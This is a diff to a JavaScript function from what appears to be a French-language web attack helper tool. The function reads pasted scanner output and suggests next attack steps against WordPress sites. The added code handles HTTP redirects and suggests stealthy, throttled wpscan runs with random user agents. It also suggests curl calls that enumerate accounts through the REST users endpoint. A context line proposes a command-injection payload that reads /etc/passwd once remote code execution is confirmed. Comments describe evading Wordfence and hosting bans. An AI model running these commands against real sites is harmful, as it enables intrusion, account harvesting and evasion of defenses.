@@ -552,6 +552,16 @@ function scan(t){
   if(/\b429\b|too many requests|rate.?limit/i.test(raw))
     return {cls:'warn',msg:'⏳ Rate-limit (429) : tu vas trop vite → les résultats sont faussés (faux négatifs). Ralentis fortement.',
       follow:[{t:'Throttle agressif',c:'# wpscan : --throttle 2000   |   ffuf : -rate 5 -t 2   puis relance',e:'Attends quelques minutes puis reprends plus lentement.'}],report:null,unlock:null};
+  // REDIRECTION (http→https, domaine→www) : la commande ne suit pas le 301 → sortie vide / « Scan Aborted ». Ce n'est PAS « rien d'exploitable ».
+  var redir = raw.match(/redirects?\s+to\s+(https?:\/\/[^\s"'<>]+)/i) || raw.match(/Location:\s*(https?:\/\/[^\s"'<>]+)/i);
+  if( redir || (/scan aborted|moved permanently|\b301\b/i.test(raw) && /www\./i.test(raw)) ){
+    var dest = (redir ? redir[1] : U.replace('://','://www.')).replace(/[\/.]+$/,'');
+    return {cls:'warn',msg:'↪️ La cible REDIRIGE vers '+dest+' (souvent domaine → www). Ta commande ne suit pas le redirect → elle renvoie du vide ou s\'arrête (« Scan Aborted »). Ce n\'est PAS une absence de faille : relance en ciblant directement l\'URL finale.',
+      follow:[
+        {t:'Refaire l\'énumération WordPress sur l\'URL finale',c:'wpscan --url '+dest+' --enumerate u,vp,vt --stealthy --throttle 800 --random-user-agent',e:'On scanne directement la bonne URL → plus de « Scan Aborted ». (Astuce : change aussi la cible en haut de l\'outil pour mettre '+dest+'.)'},
+        {t:'Comptes via REST en suivant le redirect (-L)',c:'curl -sL -A "Mozilla/5.0" '+dest+'/wp-json/wp/v2/users',e:'-L suit le 301 jusqu\'au www → tu obtiens le JSON des comptes (id/name/slug) au lieu d\'une réponse vide. Colle la sortie → Analyser.'}
+      ],report:null,unlock:null};
+  }
   // RCE (uid=… gid=…)
   if(/uid=\d+.*gid=\d+/i.test(t)) return {cls:'ok',msg:'💥 RCE CONFIRMÉE — tu exécutes des commandes sur le serveur (uid=… présent).',
     follow:[{t:'Lire un fichier (preuve)',c:'curl -s "'+U+'/?'+P+'=x;cat /etc/passwd"',e:'Preuve de lecture serveur. Pour un fichier CLIENT précis → panneau ③ ci-dessus.'}],
@@ -611,7 +621,7 @@ function scan(t){
   // WordPress détecté (page/whatweb) — mais PAS sur une sortie wpscan (déjà gérée au-dessus)
   if(/wordpress/i.test(t)) return {cls:'ok',msg:'🧩 WordPress détecté → énumère comptes + plugins vulnérables.',
     follow:[{t:'Énumérer WordPress (wpscan, discret)',c:'wpscan --url '+U+' --enumerate u,vp,vt --stealthy --throttle 800 --random-user-agent',e:'Comptes + plugins/thèmes à CVE. --stealthy + --throttle 800 (0,8s entre requêtes) = évite le ban Wordfence/hébergeur. Colle la sortie → Analyser (ne rebouclera plus).'},
-            {t:'Comptes via REST',c:'curl -s '+U+'/wp-json/wp/v2/users',e:'Fuite de comptes fréquente.'}],
+            {t:'Comptes via REST',c:'curl -sL -A "Mozilla/5.0" '+U+'/wp-json/wp/v2/users',e:'Fuite de comptes fréquente. -L suit le redirect www (sinon réponse vide).'}],
     report:null, unlock:null};
   // Sortie du TEST AUTO des endpoints (lignes « code taille url »)
   if(/^\s*\d{3}\s+\d+o?\s+https?:\/\//m.test(raw)){
